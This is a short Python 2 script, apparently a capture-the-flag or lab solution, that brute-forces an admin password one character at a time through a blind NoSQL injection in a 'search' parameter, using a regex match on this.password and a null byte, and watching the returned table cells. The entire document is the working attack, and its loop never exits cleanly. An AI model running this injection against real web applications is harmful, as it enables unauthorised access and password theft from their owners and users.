from string import ascii_lowercase
from itertools import product
import httplib, re, cookielib, urllib2, urllib
from bs4 import BeautifulSoup


if __name__ == '__main__':
	key = ''
	charset = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','-']
	while True:
		for i in charset:
			link = '[private]/?search=admin%27%20%26%26%20this.password.match%28/^'+str(key+i)+'.*$' + str('/)%00')
			r = urllib.urlopen(link).read()
			soup = BeautifulSoup(r,"lxml")
			res = str(soup.find_all("td"))
			print i
			if len(res) > 2:
				key = key + i
				print key
				break
		else:
			print 'Victory!'